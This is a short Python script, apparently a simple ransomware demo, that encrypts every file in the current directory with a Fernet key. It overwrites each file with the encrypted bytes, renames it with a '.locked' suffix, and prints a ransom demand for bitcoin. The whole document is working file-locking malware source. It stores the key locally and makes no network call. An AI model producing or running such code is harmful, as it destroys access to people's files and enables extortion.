
import os
from cryptography.fernet import Fernet


files = []

for file in os.listdir(): #won't encrypt these files, only target files
        if file == "encrypt.py" or file == "Goddid.key" or file == "decrypt.py": 
                continue
        if os.path.isfile(file):
                files.append(file)

print(files)

key = Fernet.generate_key() #generates the key to encrypt

with open("Goddid.key", "wb") as thekey: #rename as you want
        thekey.write(key)


for file in files:
        with open(file, "rb") as thefile:
                contents =  thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as thefile:
                thefile.write(contents_encrypted)

        os.rename(file, f"{file}.locked") #changes the files to .locked

print("Your files have been encrypted. Send 1000000 bitcoin to decrypt.")

